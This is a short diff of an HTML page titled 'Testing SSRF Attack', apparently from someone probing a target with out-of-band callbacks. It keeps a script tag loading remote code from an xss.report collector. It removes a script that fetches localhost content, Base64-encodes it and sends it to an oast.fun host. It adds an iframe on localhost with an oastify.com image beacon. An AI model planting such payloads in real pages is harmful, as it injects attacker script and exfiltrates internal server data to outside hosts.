@@ -62,15 +62,7 @@
          
                <script src=https://xss.report/c/ahmadzuriqi></script>  
                   <h1>Testing SSRF Attack</h1>
-    <script>
-        fetch('http://localhost/')
-            .then(response => response.text())
-            .then(data => {
-                let encodedData = btoa(data); // تحويل البيانات إلى Base64
-                fetch('http://fcyeszyzpjjaepgvtxdflyy009r92wlus.oast.fun/log?data=' + encodedData);
-            })
-            .catch(error => console.error('SSRF Failed:', error));
-    </script>
+  <iframe src=http://localhost:80 ><img src="https://5rxffz1ewqgc8sdtbn8h8srmndt4hu5j.oastify.com" alt="Sample Image" /></iframe>
             </div>
           </div>
         </div>
